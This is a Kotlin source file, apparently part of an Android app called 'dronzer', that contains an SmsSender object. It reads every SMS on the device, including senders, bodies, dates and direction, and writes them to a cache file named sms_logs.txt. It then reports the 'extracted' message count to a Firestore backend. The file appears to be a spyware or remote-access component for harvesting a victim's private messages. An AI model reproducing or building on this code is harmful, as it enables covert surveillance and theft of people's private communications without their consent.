package com.example.dronzer

import android.content.Context
import android.provider.Telephony
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object SmsSender {

    fun getSmsFile(context: Context): File? {
        val smsList = mutableListOf<String>()
        val uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE)
        
        try {
            val cursor = context.contentResolver.query(uri, projection, null, null, "date DESC")
            cursor?.use {
                val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    val address = it.getString(addressIdx)
                    val body = it.getString(bodyIdx)
                    val date = it.getLong(dateIdx)
                    val type = it.getInt(typeIdx)
                    val dateString = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(date))
                    val typeString = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "INBOX" else "SENT"

                    smsList.add("From: $address\nDate: $dateString\nType: $typeString\nMessage: $body\n----------------------------")
                }
            }
            
            if (smsList.isEmpty()) return null

            val file = File(context.cacheDir, "sms_logs.txt")
            file.writeText(smsList.joinToString("\n\n"))
            
            // Also upload to Firestore for redundancy
            FirebaseManager.uploadReport("SMS_Logs", "Extracted ${smsList.size} messages.")
            
            return file
        } catch (e: Exception) {
            Log.e("SmsSender", "Error reading SMS: ${e.message}")
            return null
        }
    }
}
